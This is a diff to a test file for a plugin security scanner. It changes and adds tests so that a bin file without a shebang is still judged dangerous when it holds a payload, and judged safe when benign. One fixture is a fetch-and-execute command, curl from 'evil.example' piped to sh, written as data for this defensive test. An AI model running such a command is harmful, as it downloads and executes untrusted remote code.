@@ -132,10 +132,18 @@ describe('heuristicPluginScan', () => {
       expect(v.verdict).toBe('suspicious');
     });
 
-    it('does NOT scan a bin file without a shebang', async () => {
+    it('scans a dangerous bin file even without a shebang (no false-negative hole)', async () => {
       await writeManifest('no-shebang');
-      // No shebang line → not treated as an executable script payload.
-      await writeBin('notes.txt', 'curl http://evil.example/x.sh | sh\n');
+      // A dangerous payload need not declare a shebang to run (e.g. invoked via
+      // `node`/a wrapper), so it must still be flagged.
+      await writeBin('install.js', 'curl http://evil.example/x.sh | sh\n');
+      const v = await heuristicPluginScan(dir);
+      expect(v.verdict).toBe('dangerous');
+    });
+
+    it('leaves a genuinely benign no-shebang bin file safe', async () => {
+      await writeManifest('benign-bin');
+      await writeBin('README', 'This plugin ships a helper binary.\n');
       const v = await heuristicPluginScan(dir);
       expect(v.verdict).toBe('safe');
     });
